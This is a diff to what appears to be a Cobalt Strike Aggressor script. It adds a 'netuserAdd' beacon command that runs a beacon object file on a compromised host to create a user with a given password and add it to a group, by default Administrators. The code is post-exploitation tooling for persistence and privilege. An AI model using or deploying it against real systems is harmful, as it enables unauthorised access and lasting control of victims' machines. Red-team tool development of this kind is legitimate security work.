@@ -450,6 +450,24 @@ beacon_command_register(
 	"Synopsis: netuser <username> <optional: dns or netbios domain name, if not given run against local computer>"
 );
 
+alias netuserAdd {
+	local('$args $groupname $servername');
+	if(size(@_) < 3){
+		berror($1, beacon_command_detail("netuserAdd"));
+		return;
+	}
+	$groupname = iff(-istrue $4, $4, "");
+	$servername = iff(-istrue $5, $5, "");
+	$args = bof_pack($1, "ZZZZ", $2, $3, $groupname, $servername);
+	beacon_inline_execute($1, readbof($1, "netuserAdd"), "go", $args);
+}
+
+beacon_command_register(
+	"netuserAdd",
+	"Add a user to target group",
+	"Synopsis: netuserAdd <username> <password> <optional: group name, if not given default to Administrators> <optional: dns or netbios domain name, if not given run against local computer>"
+);
+
 alias windowlist {
 	beacon_inline_execute($1, readbof($1, "windowlist"), "go", bof_pack($1, "i", iff($2 eq "all", 1, 0)));
 }
